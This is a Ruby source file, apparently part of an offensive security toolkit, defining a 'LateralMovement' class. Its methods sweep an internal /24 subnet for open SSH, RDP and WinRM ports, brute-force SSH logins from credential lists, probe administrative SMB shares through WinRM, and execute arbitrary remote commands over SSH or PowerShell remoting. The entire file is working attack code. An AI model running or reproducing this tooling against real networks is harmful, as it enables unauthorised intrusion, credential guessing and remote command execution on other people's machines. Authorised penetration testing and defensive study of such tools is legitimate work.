require 'socket'
require 'net/ssh'
require 'net/http'
require 'uri'
require_relative '../utils/colorize'

class LateralMovement
  def self.scan_internal_network(base_ip, ports = [22, 80, 443, 3389, 5985, 5986])
    results = []
    
    (1..254).each do |host|
      ip = "#{base_ip}.#{host}"
      ports.each do |port|
        begin
          socket = TCPSocket.new(ip, port)
          socket.close
          puts Colorize.green("Found: #{ip}:#{port}")
          results << { ip: ip, port: port, open: true }
        rescue
        end
      end
    end
    
    results
  end

  def self.bruteforce_ssh(host, port, usernames, passwords)
    results = []
    
    usernames.each do |username|
      passwords.each do |password|
        begin
          Net::SSH.start(host, username, password: password, port: port, timeout: 3, non_interactive: true) do |ssh|
            puts Colorize.green("SSH access: #{username}:#{password}@#{host}:#{port}")
            results << { host: host, port: port, username: username, password: password }
            
            output = ssh.exec!("id")
            puts Colorize.yellow("Command output: #{output}")
            
            return results
          end
        rescue Net::SSH::AuthenticationFailed
        rescue => e
        end
      end
    end
    
    results
  end

  def self.test_smb_shares(host, username, password)
    shares = ['C$', 'ADMIN$', 'IPC$', 'SHARE']
    results = []
    
    shares.each do |share|
      begin
        require 'winrm' rescue nil
        if defined?(WinRM)
          endpoint = "http://#{host}:5985/wsman"
          winrm = WinRM::Connection.new(endpoint: endpoint, user: username, password: password)
          
          winrm.shell(:powershell) do |shell|
            output = shell.run("Get-SmbShare -Name #{share}")
            if output.stdout.include?(share)
              puts Colorize.green("SMB share accessible: #{share}")
              results << { share: share, accessible: true }
            end
          end
        else
          puts Colorize.yellow("WinRM library not available")
        end
      rescue => e
      end
    end
    
    results
  end

  def self.test_winrm(host, username, password)
    begin
      require 'winrm' rescue nil
      if defined?(WinRM)
        endpoint = "http://#{host}:5985/wsman"
        winrm = WinRM::Connection.new(endpoint: endpoint, user: username, password: password)
        
        winrm.shell(:powershell) do |shell|
          output = shell.run("whoami")
          puts Colorize.green("WinRM access: #{output.stdout}")
          return { accessible: true, output: output.stdout }
        end
      else
        puts Colorize.yellow("WinRM library not available")
        return { accessible: false, error: "WinRM library required" }
      end
    rescue => e
      return { accessible: false, error: e.message }
    end
  end

  def self.test_rdp(host, port, username, password)
    begin
      socket = TCPSocket.new(host, port)
      socket.close
      
      puts Colorize.yellow("RDP port open, testing credentials...")
      puts Colorize.yellow("Note: RDP requires special libraries for full testing")
      
      return { port_open: true, tested: true }
    rescue => e
      return { port_open: false, error: e.message }
    end
  end

  def self.execute_remote_command(host, username, password, command, method = 'ssh')
    case method
    when 'ssh'
      begin
        Net::SSH.start(host, username, password: password, timeout: 5, non_interactive: true) do |ssh|
          output = ssh.exec!(command)
          puts Colorize.green("Command executed: #{command}")
          puts Colorize.yellow("Output: #{output}")
          return { success: true, output: output }
        end
      rescue => e
        return { success: false, error: e.message }
      end
    when 'winrm'
      begin
        require 'winrm' rescue nil
        if defined?(WinRM)
          endpoint = "http://#{host}:5985/wsman"
          winrm = WinRM::Connection.new(endpoint: endpoint, user: username, password: password)
          
          winrm.shell(:powershell) do |shell|
            output = shell.run(command)
            return { success: true, output: output.stdout }
          end
        else
          return { success: false, error: "WinRM library required" }
        end
      rescue => e
        return { success: false, error: e.message }
      end
    end
  end
end

